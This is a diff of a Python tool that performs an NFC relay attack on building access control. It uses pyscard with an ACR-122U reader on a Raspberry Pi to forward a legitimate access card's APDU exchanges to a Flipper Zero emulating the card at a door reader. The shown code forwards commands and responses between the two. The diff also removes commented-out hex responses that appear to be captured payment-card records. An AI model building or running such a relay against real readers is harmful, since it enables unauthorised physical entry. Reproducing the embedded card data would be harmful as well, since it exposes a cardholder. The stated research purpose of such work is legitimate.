@@ -3,7 +3,7 @@
 DISCLAIMER : This program was created for research and educational purposes only with 
     no warranty whatsoever.
 
-Created by TESSIER Solal -- 09-feb-2026
+Copyright (C) 2026 Solal TESSIER
 
 Using the pyscard (smartcard) module, the goal is to simulate a NFC relay attack between
     a legitimate reader and a legitimate access card to grant access to a building
@@ -32,7 +32,7 @@ For this program to work, you will need to call it with root privileges because 
     to avoid sudo using it's own python environment
 
 
-This is the physical setup expected :
+This is the physical setup expected (the Access Card must be placed before start):
 
     [Access Card].))  ((.[ACR-122U]---[RasPi]---[FlipperZero].))  ((.[Reader]
 
@@ -103,36 +103,32 @@ class PCSCReader():
 
     def connect(self):
         reader_list=readers() #list pc/sc readers
-        CARDTYPE = AnyCardType() #cardtype object for when we will look for the Access Card
+
         # Display the list of readers
         print("Available PC/SC readers :\n")
         for i in range(len(reader_list)):
             print(f"\t-\t{reader_list[i].name}")
         print("")
 
+
         if not len(reader_list) == 1 or not self.readername in reader_list[0].name:
             print(f"Need exactly 1 {self.readername} to continue, {len(reader_list)} readers available.")
             exit(1)
         
-        # Se connecter à la carte
+        #connect to the card
         self.connection = reader_list[0].createConnection()
         self.connection.connect()
 
     def process_apdu(self, data: bytes) -> bytes:
         print(f"apdu cmd: {data.hex()}")
 
-        """if data.hex() == "00b2010c00":
-            resp = bytes.fromhex("70759f6c0200019f650200709f66020e0e9f6b136132770025856368d15062019000990000000f9f670103563442353133323737303032353835363336385e202f5e313530363230313333303030333333303030323232323230303031313131309f62060000003800009f630600000000e0e09f6401039000")
-        elif data.hex() == "00b2011400":
-            resp = bytes.fromhex(
-                "7081a057136132770025856368d15062016583976410000f5a0861327700258563685f24031506305f25031305015f280202505f3401018c219f02069f03069f1a0295055f2a029a039c019f37049f35019f45029f4c089f34038d0c910a8a0295059f37049f4c088e0e00000000000000005e0342031f039f0702ff009f080200029f0d05b0000480009f0e050470a800009f0f05b0000480009f420209789f4a01829000")
-        else:"""
+        #send data to the card
         data, sw1, sw2 = self.connection.transmit(list(data))
         resp = bytes(data + [sw1, sw2])
         print(f"apdu resp: {resp.hex()}")
         return resp
 
-
+#initialize the FlipperZero instance and connection
 flipper = flipper_zero.FlipperZero("", debug=False)
 flipper.connect()
 flipper.set_mode_emu_iso14443A()
